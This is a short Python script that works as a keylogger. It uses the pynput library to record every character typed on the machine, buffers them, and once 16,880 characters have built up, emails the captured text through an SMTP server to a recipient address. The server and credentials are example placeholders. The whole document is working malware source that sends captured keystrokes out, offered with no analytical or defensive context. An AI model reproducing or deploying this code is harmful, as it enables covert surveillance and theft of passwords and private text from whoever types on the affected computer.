import smtplib
from pynput import keyboard

smtp_server = 'smtp.example.com'
smtp_port = 587
smtp_username = 'your_email@example.com'
smtp_password = 'your_password'
recipient_email = 'recipient@example.com'

character_count = 0
message = ""

def send_email(message):
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(smtp_username, recipient_email, message)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_key_press(key):
    global character_count, message
    try:
        character = key.char
        character_count += 1
        message += character
        print(message)
        if character_count >= 16880:
            send_email(message)
            character_count = 0
            message = ""
    except AttributeError:
        pass

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
